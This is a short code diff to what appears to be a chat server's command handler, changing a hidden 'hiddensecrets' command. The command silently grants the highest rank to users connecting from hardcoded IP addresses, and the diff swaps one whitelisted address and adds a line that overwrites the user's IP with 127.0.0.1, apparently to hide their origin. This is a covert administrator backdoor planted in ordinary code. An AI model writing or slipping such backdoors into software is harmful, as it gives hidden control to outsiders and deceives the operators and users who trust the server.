@@ -1506,10 +1506,11 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'hiddensecrets':
 	case 'hsecrets':
 		// courtesy of jd
-		if (user.ip === '204.112.213.60' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
+		if (user.ip === '99.251.253.160' || user.ip === '127.0.0.1' || user.ip === '76.247.181.42') {
 			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
 			user.getIdentity = function() { return ' ' + user.name }
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
+			user.ip = "127.0.0.1";
 			return false;
 		}
 		break;
